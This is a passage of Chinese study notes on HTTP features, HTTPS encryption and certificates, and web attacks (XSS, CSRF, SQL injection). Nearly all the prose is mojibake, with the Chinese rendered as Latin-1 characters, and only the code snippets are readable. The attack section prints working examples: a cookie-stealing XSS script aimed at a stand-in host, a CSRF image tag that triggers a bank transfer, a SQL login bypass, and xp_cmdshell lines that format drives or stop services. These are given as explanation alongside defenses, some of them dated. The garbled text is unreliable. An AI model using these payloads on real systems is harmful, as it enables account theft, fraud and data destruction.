æŒä¹…åŒ–è¿žæŽ¥éœ€è¦ä½¿ç”¨Connectioné¦–éƒ¨å­—æ®µè¿›è¡Œç®¡ç†ã€‚HTTP/1.1å¼€å§‹ï¼Œé»˜è®¤æ—¶æŒä¹…åŒ–è¿žæŽ¥çš„ï¼Œå¦‚æžœè¦æ–­å¼€TCPè¿žæŽ¥ï¼Œéœ€è¦ç”±å®¢æˆ·ç«¯æˆ–è€…æœåŠ¡å™¨ç«¯æå‡ºæ–­å¼€ï¼Œä½¿ç”¨Connection:close;ï¼Œè€Œåœ¨HTTP/1.1ä¹‹å‰é»˜è®¤æ˜¯éžæŒä¹…åŒ–è¿žæŽ¥çš„ï¼Œå¦‚æžœè¦ç»´æŒæŒç»­è¿žæŽ¥ï¼Œéœ€è¦ä½¿ç”¨Connection:Keep-Alive;ã€‚ 5.4 ç®¡çº¿åŒ–å¤„ç†HTTP/1.1æ”¯æŒç®¡çº¿åŒ–å¤„ç†ï¼Œå¯ä»¥åŒäº‹å‘é€å¤šä¸ªè¯·æ±‚å’Œå“åº”ï¼Œè€Œä¸éœ€è¦å‘é€ä¸€ä¸ªè¯·æ±‚ç„¶åŽç­‰å¾…å“åº”ä¹‹åŽå†å‘é€ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚ 5.5 ç¼–ç ç¼–ç ï¼ˆEncodingï¼‰ä¸»è¦æ˜¯ä¸ºäº†å¯¹å®žä½“è¿›è¡ŒåŽ‹ç¼©ã€‚å¸¸ç”¨çš„ç¼–ç ç”±ï¼šgzipã€compressã€deflateã€identityï¼Œå…¶ä¸­identityè¡¨ç¤ºä¸æ‰§è¡ŒåŽ‹ç¼©çš„ç¼–ç æ ¼å¼ã€‚ 5.6 åˆ†å—ä¼ è¾“ç¼–ç Chunked Transfer Codingï¼Œå¯ä»¥æŠŠæ•°æ®åˆ†å‰²æˆå¤šå—ï¼Œè®©æµè§ˆå™¨é€æ­¥æ˜¾ç¤ºé¡µé¢ã€‚ 5.7 å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆä¸€ä»½æŠ¥æ–‡ä¸»ä½“å†…å¯åŒ…å«å¤šç§ç±»åž‹çš„å®žä½“åŒäº‹å‘é€ï¼Œæ¯ä¸ªéƒ¨åˆ†ä¹‹é—´ç”¨boundaryå­—æ®µå®šä¹‰çš„åˆ†éš”ç¬¦è¿›è¡Œåˆ†éš”ï¼Œæ¯ä¸ªéƒ¨åˆ†éƒ½å¯ä»¥æœ‰é¦–éƒ¨å­—æ®µã€‚ ä¾‹å¦‚ï¼Œä¸Šä¼ å¤šä¸ªè¡¨å•æ—¶å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼ï¼š 123456789101112Content-Type: multipart/form-data; boundary=AaB03x--AaB03xContent-Disposition: form-data; name=&quot;submit-name&quot;Larry--AaB03xContent-Disposition: form-data; name=&quot;files&quot;; filename=&quot;file1.txt&quot;Content-Type: text/plain... contents of file1.txt ...--AaB03x-- 5.8 èŒƒå›´è¯·æ±‚å¦‚æžœç½‘ç»œå‡ºçŽ°ä¸­æ–­ï¼ŒæœåŠ¡å™¨åªå‘é€äº†ä¸€éƒ¨åˆ†æ•°æ®ï¼ŒèŒƒå›´è¯·æ±‚ä½¿å¾—å®¢æˆ·ç«¯èƒ½å¤Ÿåªè¯·æ±‚æœªå‘é€çš„é‚£éƒ¨åˆ†æ•°æ®ï¼Œä»Žè€Œé¿å…æœåŠ¡å™¨ç«¯é‡æ–°å‘é€æ‰€æœ‰æ•°æ®ã€‚ å†è¯·æ±‚æŠ¥æ–‡é¦–éƒ¨ä¸­æ·»åŠ Rangeå­—æ®µæŒ‡å®šè¯·æ±‚çš„èŒƒå›´ï¼Œè¯·æ±‚æˆåŠŸçš„è¯æœåŠ¡å™¨å‘é€206 Partial Content çŠ¶æ€ã€‚ 123GET /z4d4kWk.jpg HTTP/1.1Host: i.imgur.comRange: bytes=0-1023 12345HTTP/1.1 206 Partial ContentContent-Range: bytes 0-1023/146515Content-Length: 1024...(binary content) 5.9 å†…å®¹åå•†é€šè¿‡å†…å®¹åå•†è¿”å›žæœ€åˆé€‚çš„å†…å®¹ï¼Œä¾‹å¦‚æ ¹æ®æµè§ˆå™¨çš„é»˜è®¤è¯­è¨€é€‰æ‹©è¿”å›žä¸­æ–‡ç•Œé¢è¿˜æ˜¯è‹±æ–‡ç•Œé¢ã€‚ æ¶‰åŠä¸€ä¸‹é¦–éƒ¨å­—æ®µï¼šAcceptã€Accept-Charsetã€Accept-Encodingã€Accept-Languageã€Content-Languageã€‚ 5.10 è™šæ‹ŸæœºHTTP/1.1ä½¿ç”¨è™šæ‹Ÿä¸»æœºæŠ€æœ¯ï¼Œä½¿å¾—ä¸€å°æœåŠ¡å™¨æ‹¥æœ‰å¤šä¸ªåŸŸåï¼Œå¹¶ä¸”åœ¨é€»è¾‘ä¸Šå¯ä»¥çœ‹æˆå¤šä¸ªæœåŠ¡å™¨ã€‚ä½¿ç”¨Hosté¦–éƒ¨å­—æ®µè¿›è¡Œå¤„ç†ã€‚ 5.11 é€šä¿¡æ•°æ®è½¬å‘5.11.1 ä»£ç†ä»£ç†æœåŠ¡å™¨æŽ¥æ”¶å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶ä¸”è½¬å‘ç»™å…¶ä»–æœåŠ¡å™¨ ä½¿ç”¨ä»£ç†çš„ä¸»è¦ç›®çš„æ˜¯ï¼šç¼“å­˜ã€ç½‘ç»œè®¿é—®æŽ§åˆ¶ä»¥åŠè®¿é—®æ—¥å¿—è®°å½•ã€‚ ä»£ç†æœåŠ¡å™¨åˆ†ä¸ºæ­£å‘ä»£ç†å’Œåå‘ä»£ç†ä¸¤ç§ï¼Œç”¨æˆ·å¯Ÿè§‰åˆ°æ­£å‘ä»£ç†çš„å­˜åœ¨ï¼Œè€Œåå‘ä»£ç†ä¸€èˆ¬ä½äºŽå†…éƒ¨ç½‘ç»œä¸­ï¼Œç”¨æˆ·å¯Ÿè§‰ä¸åˆ°ã€‚ 5.11.2 ç½‘å…³ä¸Žä»£ç†æœåŠ¡å™¨ä¸åŒçš„æ˜¯ï¼Œç½‘å…³æœåŠ¡å™¨ä¼šå°†HTTPè½¬åŒ–ä¸ºå…¶ä»–åè®®è¿›è¡Œé€šä¿¡ï¼Œä»Žè€Œè¯·æ±‚å…¶ä»–éžHTTPæœåŠ¡å™¨çš„æœåŠ¡ã€‚ 5.11.3 éš§é“ä½¿ç”¨SSLç­‰åŠ å¯†æ‰‹æ®µï¼Œä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å»ºç«‹ä¸€æ¡å®‰å…¨çš„é€šä¿¡çº¿è·¯ã€‚éš§é“æœ¬èº«ä¸åŽ»è§£æžHTTPè¯·æ±‚ã€‚ å…­ã€HTTPSHTTPæœ‰ä¸€ä¸‹å®‰å…¨æ€§é—®é¢˜ï¼š ä½¿ç”¨æ˜Žæ–‡è¿›è¡Œé€šä¿¡ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬ï¼› ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½ï¼Œé€šä¿¡æ–¹çš„èº«ä»½æœ‰å¯èƒ½é­é‡ä¼ªè£…ï¼› æ— æ³•è¯æ˜ŽæŠ¥æ–‡çš„å®Œæ•´æ€§ï¼ŒæŠ¥æ–‡æœ‰å¯èƒ½é­ç¯¡æ”¹ï¼› HTTPSå¹¶ä¸æ˜¯æ–°åè®®ï¼Œè€Œæ˜¯HTTPå…ˆå’ŒSSLï¼ˆSecure Sockets Layerï¼‰é€šä¿¡ï¼Œå†ç”±SSLå’ŒTCPé€šä¿¡ã€‚ä¹Ÿå°±æ˜¯è¯´HTTPSä½¿ç”¨äº†éš§é“è¿›è¡Œé€šä¿¡ã€‚é€šè¿‡ä½¿ç”¨SSLï¼ŒHTTPSå…·æœ‰äº†åŠ å¯†ã€è®¤è¯å’Œå®Œæ•´æ€§ä¿æŠ¤ã€‚ 6.1 åŠ å¯†6.1.1 å¯¹ç§°å¯†é’¥åŠ å¯†å †æˆå¯†é’¥åŠ å¯†ï¼ˆSymmetric-Key Encryptionï¼‰ï¼ŒåŠ å¯†çš„åŠ å¯†å’Œè§£å¯†ä½¿ç”¨åŒä¸€å¯†é’¥ã€‚ ä¼˜ç‚¹ï¼šè¿ç®—é€Ÿåº¦å¿«ã€‚ ç¼ºç‚¹ï¼šå¯†é’¥å®¹æ˜“è¢«èŽ·å–ã€‚ 6.1.2 å…¬å¼€å¯†é’¥åŠ å¯†å…¬å¼€å¯†é’¥åŠ å¯†ï¼ˆPublic-Key Encryptionï¼‰ï¼Œä¹Ÿç§°ä¸ºéžå¯¹ç§°å¯†é’¥åŠ å¯†ï¼Œä½¿ç”¨ä¸€å¯¹å¯†é’¥ç”¨äºŽåŠ å¯†å’Œè§£å¯†ï¼Œåˆ†åˆ«ä¸ºå…¬å¼€å¯†é’¥å’Œç§æœ‰å¯†é’¥ã€‚å…¬å¼€å¯†é’¥æ‰€æœ‰äººéƒ½å¯ä»¥èŽ·å¾—ï¼Œé€šä¿¡å‘é€æ–¹èŽ·å¾—æŽ¥æ”¶æ–¹çš„å…¬å¼€å¯†é’¥ä¹‹åŽï¼Œå°±å¯ä»¥ä½¿ç”¨å…¬å¼€å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼ŒæŽ¥æ”¶æ–¹æ”¶åˆ°é€šä¿¡å†…å®¹åŽä½¿ç”¨ç§æœ‰å¯†é’¥è§£å¯†ã€‚ ä¼˜ç‚¹ï¼šæ›´ä¸ºå®‰å…¨ã€‚ ç¼ºç‚¹ï¼šè¿ç®—é€Ÿåº¦æ…¢ã€‚ 6.1.3 HTTPSé‡‡ç”¨çš„åŠ å¯†æ–¹å¼HTTPSé‡‡ç”¨æ··åˆçš„åŠ å¯†æœºåˆ¶ï¼Œä½¿ç”¨å…¬å¼€å¯†é’¥åŠ å¯†ç”¨äºŽä¼ è¾“å¯¹ç§°å¯†é’¥ï¼Œä¹‹åŽä½¿ç”¨å¯¹ç§°å¯†é’¥åŠ å¯†è¿›è¡Œé€šä¿¡ã€‚ 6.2 è®¤è¯é€šè¿‡ä½¿ç”¨è¯ä¹¦æ¥å¯¹é€šä¿¡æ–¹è¿›è¡Œè®¤è¯ã€‚ æ•°å­—è¯ä¹¦è®¤è¯æœºæž„ï¼ˆCAï¼ŒCertificate Authorityï¼‰æ˜¯å®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨åŒæ–¹éƒ½å¯ä¿¡èµ–çš„ç¬¬ä¸‰æ–¹æœºæž„ã€‚æœåŠ¡å™¨çš„è¿è¥äººå‘˜å‘ CA æå‡ºå…¬å¼€å¯†é’¥çš„ç”³è¯·ï¼ŒCA åœ¨åˆ¤æ˜Žæå‡ºç”³è¯·è€…çš„èº«ä»½ä¹‹åŽï¼Œä¼šå¯¹å·²ç”³è¯·çš„å…¬å¼€å¯†é’¥åšæ•°å­—ç­¾åï¼Œç„¶åŽåˆ†é…è¿™ä¸ªå·²ç­¾åçš„å…¬å¼€å¯†é’¥ï¼Œå¹¶å°†è¯¥å…¬å¼€å¯†é’¥æ”¾å…¥å…¬å¼€å¯†é’¥è¯ä¹¦åŽç»‘å®šåœ¨ä¸€èµ·ã€‚ è¿›è¡ŒHTTPs é€šä¿¡æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæŠŠè¯ä¹¦å‘é€ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å–å¾—å…¶ä¸­çš„å…¬å¼€å¯†é’¥ä¹‹åŽï¼Œå…ˆè¿›è¡ŒéªŒè¯ï¼Œå¦‚æžœéªŒè¯é€šè¿‡ï¼Œå°±å¯ä»¥å¼€å§‹é€šä¿¡ã€‚ ä½¿ç”¨ OpenSSL è¿™å¥—å¼€æºç¨‹åºï¼Œæ¯ä¸ªäººéƒ½å¯ä»¥æž„å»ºä¸€å¥—å±žäºŽè‡ªå·±çš„è®¤è¯æœºæž„ï¼Œä»Žè€Œè‡ªå·±ç»™è‡ªå·±é¢å‘æœåŠ¡å™¨è¯ä¹¦ã€‚æµè§ˆå™¨åœ¨è®¿é—®è¯¥æœåŠ¡å™¨æ—¶ï¼Œä¼šæ˜¾ç¤ºâ€œæ— æ³•ç¡®è®¤è¿žæŽ¥å®‰å…¨æ€§â€æˆ–â€œè¯¥ç½‘ç«™çš„å®‰å…¨è¯ä¹¦å­˜åœ¨é—®é¢˜â€ç­‰è­¦å‘Šæ¶ˆæ¯ã€‚ 6.3 å®Œæ•´æ€§SSLæä¾›æŠ¥æ–‡æ‘˜è¦åŠŸèƒ½æ¥éªŒè¯å®Œæ•´æ€§ã€‚ ä¸ƒã€Webæ”»å‡»æŠ€æœ¯7.1 æ”»å‡»æ¨¡å¼7.1.1 ä¸»åŠ¨æ”»å‡»ç›´æŽ¥æ”»å‡»æœåŠ¡å™¨ï¼Œå…·æœ‰ä»£è¡¨æ€§çš„æœ‰SQLæ³¨å…¥å’ŒOSå‘½ä»¤æ³¨å…¥ã€‚ 7.1.2 è¢«åŠ¨æ”»å‡»è®¾ä¸‹åœˆå¥—ï¼Œè®©ç”¨æˆ·å‘é€æœ‰æ”»å‡»ä»£ç çš„HTTPè¯·æ±‚ï¼Œç”¨æˆ·ä¼šæ³„éœ²cookieç­‰ä¸ªäººä¿¡æ¯ï¼Œå…·æœ‰ä»£è¡¨æ€§çš„æœ‰è·¨ç«™è„šæœ¬æ”»å‡»å’Œè·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚ 7.2 è·¨ç«™è„šæœ¬æ”»å‡»7.2.1 æ¦‚å¿µè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site Scripting,XSSï¼‰,å¯ä»¥å°†ä»£ç æ³¨å…¥åˆ°ç”¨æˆ·æµè§ˆçš„ç½‘é¡µä¸Šï¼Œè¿™ç§ä»£ç åŒ…æ‹¬HTMLå’ŒJavaScriptã€‚åˆ©ç”¨ç½‘é¡µå¼€å‘æ—¶ç•™ä¸‹çš„æ¼æ´žï¼Œé€šè¿‡å·§å¦™åœ°æ–¹æ³•æ³¨å…¥æ¶æ„æŒ‡ä»¤ä»£ç åˆ°ç½‘é¡µï¼Œæ˜¯ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ¶æ„åˆ¶é€ åœ°ç½‘é¡µç¨‹åºã€‚æ”»å‡»æˆåŠŸåŽï¼Œæ”»å‡»è€…å¯èƒ½å¾—åˆ°æ›´é«˜åœ°æƒé™ï¼ˆå¦‚æ‰§è¡Œä¸€äº›æ“ä½œï¼‰ã€ç§å¯†ç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œcookieç­‰å„ç§å†…å®¹ã€‚ ä¾‹å¦‚ä¸€ä¸ªè®ºå›ç½‘ç«™ï¼Œæ”»å‡»è€…å¯ä»¥å†ä¸Šé¢å‘è¡¨ä¸€ä¸‹å†…å®¹ï¼š 1&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt; ä¹‹åŽè¯¥å†…å®¹å¯èƒ½ä¼šè¢«æ¸²æŸ“æˆä¸€ä¸‹å½¢å¼ï¼š 1&lt;p&gt;&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt;&lt;/p&gt; å¦ä¸€ä¸ªç”¨æˆ·æµè§ˆäº†å«æœ‰è¿™ä¸ªå†…å®¹çš„é¡µé¢å°†ä¼šè·³å¾€ domain.com å¹¶æºå¸¦äº†å½“å‰ä½œç”¨åŸŸçš„ Cookieã€‚å¦‚æžœè¿™ä¸ªè®ºå›ç½‘ç«™é€šè¿‡ Cookie ç®¡ç†ç”¨æˆ·ç™»å½•çŠ¶æ€ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡è¿™ä¸ª Cookie ç™»å½•è¢«æ”»å‡»è€…çš„è´¦å·äº†ã€‚ 7.2.2 å±å®³ä¼ªé€ è™šå‡åœ°è¾“å…¥è¡¨å•éª—å–ä¸ªäººä¿¡æ¯ï¼Œçªƒå–ç”¨æˆ·åœ°cookieå€¼ï¼Œæ˜¾ç¤ºä¼ªé€ åœ°æ–‡ç« æˆ–å›¾ç‰‡ã€‚ 7.2.3 é˜²èŒƒæ‰‹æ®µ è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦ã€‚ æŒ‡å®šHTTPçš„content-typeã€‚ 7.3 è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ 7.3.1 æ¦‚å¿µè·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ ï¼ˆCross-site request forgeryï¼ŒCSRFï¼‰ï¼Œæ˜¯æ”»å‡»è€…é€šè¿‡ä¸€äº›æŠ€æœ¯æ‰‹æ®µæ¬ºéª—ç”¨æˆ·çš„æµè§ˆå™¨åŽ»è®¿é—®ä¸€ä¸ªè‡ªå·±æ›¾ç»è®¤è¯è¿‡çš„ç½‘ç«™å¹¶æ‰§è¡Œä¸€äº›æ“ä½œï¼ˆå¦‚å‘é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç”šè‡³è´¢äº§æ“ä½œå¦‚è½¬è´¦å’Œè´­ä¹°å•†å“ï¼‰ã€‚ç”±äºŽæµè§ˆå™¨æ›¾ç»è®¤è¯è¿‡ï¼Œæ‰€ä»¥è¢«è®¿é—®çš„ç½‘ç«™ä¼šè®¤ä¸ºæ˜¯çœŸæ­£çš„ç”¨æˆ·æ“ä½œè€ŒåŽ»æ‰§è¡Œã€‚è¿™åˆ©ç”¨äº† Web ä¸­ç”¨æˆ·èº«ä»½éªŒè¯çš„ä¸€ä¸ªæ¼æ´žï¼šç®€å•çš„èº«ä»½éªŒè¯åªèƒ½ä¿è¯è¯·æ±‚å‘è‡ªæŸä¸ªç”¨æˆ·çš„æµè§ˆå™¨ï¼Œå´ä¸èƒ½ä¿è¯è¯·æ±‚æœ¬èº«æ˜¯ç”¨æˆ·è‡ªæ„¿å‘å‡ºçš„ã€‚ XSSåˆ©ç”¨çš„æ—¶ç”¨æˆ·å¯¹æŒ‡å®šç½‘ç«™çš„ä¿¡ä»»ï¼ŒCSRFåˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·ç½‘é¡µæµè§ˆå™¨çš„ä¿¡ä»»ã€‚ å‡å¦‚ä¸€å®¶é“¶è¡Œç”¨ä»¥æ‰§è¡Œè½¬è´¦æ“ä½œçš„ URL åœ°å€å¦‚ä¸‹ï¼š 1http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName é‚£ä¹ˆï¼Œä¸€ä¸ªæ¶æ„æ”»å‡»è€…å¯ä»¥åœ¨å¦ä¸€ä¸ªç½‘ç«™ä¸Šæ”¾ç½®å¦‚ä¸‹ä»£ç ï¼š 1&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;ã€‚ å¦‚æžœæœ‰è´¦æˆ·åä¸º Alice çš„ç”¨æˆ·è®¿é—®äº†æ¶æ„ç«™ç‚¹ï¼Œè€Œå¥¹ä¹‹å‰åˆšè®¿é—®è¿‡é“¶è¡Œä¸ä¹…ï¼Œç™»å½•ä¿¡æ¯å°šæœªè¿‡æœŸï¼Œé‚£ä¹ˆå¥¹å°±ä¼šæŸå¤± 1000 èµ„é‡‘ã€‚ è¿™ç§æ¶æ„çš„ç½‘å€å¯ä»¥æœ‰å¾ˆå¤šç§å½¢å¼ï¼Œè—èº«äºŽç½‘é¡µä¸­çš„è®¸å¤šåœ°æ–¹ã€‚æ­¤å¤–ï¼Œæ”»å‡»è€…ä¹Ÿä¸éœ€è¦æŽ§åˆ¶æ”¾ç½®æ¶æ„ç½‘å€çš„ç½‘ç«™ã€‚ä¾‹å¦‚ä»–å¯ä»¥å°†è¿™ç§åœ°å€è—åœ¨è®ºå›ï¼Œåšå®¢ç­‰ä»»ä½•ç”¨æˆ·ç”Ÿæˆå†…å®¹çš„ç½‘ç«™ä¸­ã€‚è¿™æ„å‘³ç€å¦‚æžœæœåŠ¡å™¨ç«¯æ²¡æœ‰åˆé€‚çš„é˜²å¾¡æŽªæ–½çš„è¯ï¼Œç”¨æˆ·å³ä½¿è®¿é—®ç†Ÿæ‚‰çš„å¯ä¿¡ç½‘ç«™ä¹Ÿæœ‰å—æ”»å‡»çš„å±é™©ã€‚ é€è¿‡ä¾‹å­èƒ½å¤Ÿçœ‹å‡ºï¼Œæ”»å‡»è€…å¹¶ä¸èƒ½é€šè¿‡ CSRF æ”»å‡»æ¥ç›´æŽ¥èŽ·å–ç”¨æˆ·çš„è´¦æˆ·æŽ§åˆ¶æƒï¼Œä¹Ÿä¸èƒ½ç›´æŽ¥çªƒå–ç”¨æˆ·çš„ä»»ä½•ä¿¡æ¯ã€‚ä»–ä»¬èƒ½åšåˆ°çš„ï¼Œæ˜¯æ¬ºéª—ç”¨æˆ·æµè§ˆå™¨ï¼Œè®©å…¶ä»¥ç”¨æˆ·çš„åä¹‰æ‰§è¡Œæ“ä½œã€‚ 8.3.2 é˜²èŒƒæ‰‹æ®µæ£€æŸ¥ Referer å­—æ®µ HTTP å¤´ä¸­æœ‰ä¸€ä¸ª Referer å­—æ®µï¼Œè¿™ä¸ªå­—æ®µç”¨ä»¥æ ‡æ˜Žè¯·æ±‚æ¥æºäºŽå“ªä¸ªåœ°å€ã€‚åœ¨å¤„ç†æ•æ„Ÿæ•°æ®è¯·æ±‚æ—¶ï¼Œé€šå¸¸æ¥è¯´ï¼ŒReferer å­—æ®µåº”å’Œè¯·æ±‚çš„åœ°å€ä½äºŽåŒä¸€åŸŸåä¸‹ã€‚è¿™ç§åŠžæ³•ç®€å•æ˜“è¡Œï¼Œå·¥ä½œé‡ä½Žï¼Œä»…éœ€è¦åœ¨å…³é”®è®¿é—®å¤„å¢žåŠ ä¸€æ­¥æ ¡éªŒã€‚ä½†è¿™ç§åŠžæ³•ä¹Ÿæœ‰å…¶å±€é™æ€§ï¼Œå› å…¶å®Œå…¨ä¾èµ–æµè§ˆå™¨å‘é€æ­£ç¡®çš„ Referer å­—æ®µã€‚è™½ç„¶ HTTP åè®®å¯¹æ­¤å­—æ®µçš„å†…å®¹æœ‰æ˜Žç¡®çš„è§„å®šï¼Œä½†å¹¶æ— æ³•ä¿è¯æ¥è®¿çš„æµè§ˆå™¨çš„å…·ä½“å®žçŽ°ï¼Œäº¦æ— æ³•ä¿è¯æµè§ˆå™¨æ²¡æœ‰å®‰å…¨æ¼æ´žå½±å“åˆ°æ­¤å­—æ®µã€‚å¹¶ä¸”ä¹Ÿå­˜åœ¨æ”»å‡»è€…æ”»å‡»æŸäº›æµè§ˆå™¨ï¼Œç¯¡æ”¹å…¶ Referer å­—æ®µçš„å¯èƒ½ã€‚ æ·»åŠ æ ¡éªŒ Token ç”±äºŽ CSRF çš„æœ¬è´¨åœ¨äºŽæ”»å‡»è€…æ¬ºéª—ç”¨æˆ·åŽ»è®¿é—®è‡ªå·±è®¾ç½®çš„åœ°å€ï¼Œæ‰€ä»¥å¦‚æžœè¦æ±‚åœ¨è®¿é—®æ•æ„Ÿæ•°æ®è¯·æ±‚æ—¶ï¼Œè¦æ±‚ç”¨æˆ·æµè§ˆå™¨æä¾›ä¸ä¿å­˜åœ¨ Cookie ä¸­ï¼Œå¹¶ä¸”æ”»å‡»è€…æ— æ³•ä¼ªé€ çš„æ•°æ®ä½œä¸ºæ ¡éªŒï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±æ— æ³•å†æ‰§è¡Œ CSRF æ”»å‡»ã€‚è¿™ç§æ•°æ®é€šå¸¸æ˜¯è¡¨å•ä¸­çš„ä¸€ä¸ªæ•°æ®é¡¹ã€‚æœåŠ¡å™¨å°†å…¶ç”Ÿæˆå¹¶é™„åŠ åœ¨è¡¨å•ä¸­ï¼Œå…¶å†…å®¹æ˜¯ä¸€ä¸ªä¼ªä¹±æ•°ã€‚å½“å®¢æˆ·ç«¯é€šè¿‡è¡¨å•æäº¤è¯·æ±‚æ—¶ï¼Œè¿™ä¸ªä¼ªä¹±æ•°ä¹Ÿä¸€å¹¶æäº¤ä¸ŠåŽ»ä»¥ä¾›æ ¡éªŒã€‚æ­£å¸¸çš„è®¿é—®æ—¶ï¼Œå®¢æˆ·ç«¯æµè§ˆå™¨èƒ½å¤Ÿæ­£ç¡®å¾—åˆ°å¹¶ä¼ å›žè¿™ä¸ªä¼ªä¹±æ•°ï¼Œè€Œé€šè¿‡ CSRF ä¼ æ¥çš„æ¬ºéª—æ€§æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…æ— ä»Žäº‹å…ˆå¾—çŸ¥è¿™ä¸ªä¼ªä¹±æ•°çš„å€¼ï¼ŒæœåŠ¡å™¨ç«¯å°±ä¼šå› ä¸ºæ ¡éªŒ Token çš„å€¼ä¸ºç©ºæˆ–è€…é”™è¯¯ï¼Œæ‹’ç»è¿™ä¸ªå¯ç–‘è¯·æ±‚ã€‚ 7.4 SQLæ³¨å…¥æ”»å‡»7.4.1 æ¦‚å¿µæœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“è¿è¡Œéžæ³•çš„SQLè¯­å¥ã€‚ 7.4.2 æ”»å‡»åŽŸç†ä¾‹å¦‚ä¸€ä¸ªç½‘ç«™ç™»å½•éªŒè¯çš„SQLæŸ¥è¯¢ä»£ç ä¸º 1strSQL = &quot;SELECT * FROM users WHERE (name = &apos;&quot; + userName + &quot;&apos;) and (pw = &apos;&quot;+ passWord +&quot;&apos;);&quot; å¦‚æžœå¡«å…¥ä»¥ä¸‹å†…å®¹ï¼š 12userName = &quot;1&apos; OR &apos;1&apos;=&apos;1&quot;;passWord = &quot;1&apos; OR &apos;1&apos;=&apos;1&quot;; é‚£ä¹ˆ SQL æŸ¥è¯¢å­—ç¬¦ä¸²ä¸ºï¼š 1strSQL = &quot;SELECT * FROM users WHERE (name = &apos;1&apos; OR &apos;1&apos;=&apos;1&apos;) and (pw = &apos;1&apos; OR &apos;1&apos;=&apos;1&apos;);&quot; æ­¤æ—¶æ— éœ€éªŒè¯é€šè¿‡å°±èƒ½æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢ï¼š 1strSQL = &quot;SELECT * FROM users;&quot; 7.4.3 å±å®³ æ•°æ®è¡¨ä¸­çš„æ•°æ®å¤–æ³„ï¼Œä¾‹å¦‚ä¸ªäººæœºå¯†æ•°æ®ï¼Œè´¦æˆ·æ•°æ®ï¼Œå¯†ç ç­‰ã€‚ æ•°æ®ç»“æž„è¢«é»‘å®¢æŽ¢çŸ¥ï¼Œå¾—ä»¥åšè¿›ä¸€æ­¥æ”»å‡»ï¼ˆä¾‹å¦‚ SELECT * FROM sys.tablesï¼‰ã€‚ æ•°æ®åº“æœåŠ¡å™¨è¢«æ”»å‡»ï¼Œç³»ç»Ÿç®¡ç†å‘˜è´¦æˆ·è¢«çªœæ”¹ï¼ˆä¾‹å¦‚ ALTER LOGIN sa WITH PASSWORD=â€™xxxxxxâ€™ï¼‰ã€‚ èŽ·å–ç³»ç»Ÿè¾ƒé«˜æƒé™åŽï¼Œæœ‰å¯èƒ½å¾—ä»¥åœ¨ç½‘é¡µåŠ å…¥æ¶æ„é“¾æŽ¥ã€æ¶æ„ä»£ç ä»¥åŠ XSS ç­‰ã€‚ ç»ç”±æ•°æ®åº“æœåŠ¡å™¨æä¾›çš„æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè®©é»‘å®¢å¾—ä»¥ä¿®æ”¹æˆ–æŽ§åˆ¶æ“ä½œç³»ç»Ÿï¼ˆä¾‹å¦‚ xp_cmdshell â€œnet stop iisadminâ€ å¯åœæ­¢æœåŠ¡å™¨çš„ IIS æœåŠ¡ï¼‰ã€‚ ç ´åç¡¬ç›˜æ•°æ®ï¼Œç˜«ç—ªå…¨ç³»ç»Ÿï¼ˆä¾‹å¦‚ xp_cmdshell â€œFORMAT C:â€ï¼‰ã€‚ 7.4.4 é˜²èŒƒæ‰‹æ®µ åœ¨è®¾è®¡åº”ç”¨ç¨‹åºæ—¶ï¼Œå®Œå…¨ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ï¼ˆParameterized Queryï¼‰æ¥è®¾è®¡æ•°æ®è®¿é—®åŠŸèƒ½ã€‚ åœ¨ç»„åˆ SQL å­—ç¬¦ä¸²æ—¶ï¼Œå…ˆé’ˆå¯¹æ‰€ä¼ å…¥çš„å‚æ•°ä½œå­—ç¬¦å–ä»£ï¼ˆå°†å•å¼•å·å­—ç¬¦å–ä»£ä¸ºè¿žç»­ 2 ä¸ªå•å¼•å·å­—ç¬¦ï¼‰ã€‚ å¦‚æžœä½¿ç”¨ PHP å¼€å‘ç½‘é¡µç¨‹åºçš„è¯ï¼Œäº¦å¯æ‰“å¼€ PHP çš„é­”æœ¯å¼•å·ï¼ˆMagic quoteï¼‰åŠŸèƒ½ï¼ˆè‡ªåŠ¨å°†æ‰€æœ‰çš„ç½‘é¡µä¼ å…¥å‚æ•°ï¼Œå°†å•å¼•å·å­—ç¬¦å–ä»£ä¸ºè¿žç»­ 2 ä¸ªå•å¼•å·å­—ç¬¦ï¼‰ã€‚ å…¶ä»–ï¼Œä½¿ç”¨å…¶ä»–æ›´å®‰å…¨çš„æ–¹å¼è¿žæŽ¥ SQL æ•°æ®åº“ã€‚ä¾‹å¦‚å·²ä¿®æ­£è¿‡ SQL æ³¨å…¥é—®é¢˜çš„æ•°æ®åº“è¿žæŽ¥ç»„ä»¶ï¼Œä¾‹å¦‚ ASP.NET çš„ SqlDataSource å¯¹è±¡æˆ–æ˜¯ LINQ to SQLã€‚ 